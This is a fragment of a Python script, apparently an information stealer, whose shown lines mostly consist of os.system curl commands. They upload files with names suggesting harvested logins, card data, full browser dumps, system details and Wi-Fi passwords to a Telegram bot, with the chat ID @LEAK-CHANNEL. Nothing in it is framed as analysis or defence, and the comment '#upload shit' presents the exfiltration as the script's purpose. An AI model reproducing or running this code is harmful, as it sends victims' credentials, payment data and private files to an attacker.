...
try:
    ...
    print(e)
    #upload shit
os.system('curl -F document=@"elog.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
os.system('curl -F document=@"ecc.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
os.system('curl -F document=@"efull.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
os.system('curl -F document=@"sys.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
...
try:
    ...
    print(e)
    #upload shit
os.system('curl -F document=@"clog.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
os.system('curl -F document=@"ccc.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
os.system('curl -F document=@"cfull.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
...
if __name__ == '__main__':
    ...
    f.write(result)
    f.close()
os.system('curl -F document=@"wifi.txt" https://api.telegram.org/botYOUR-ID/sendDocument?chat_id=@LEAK-CHANNEL')
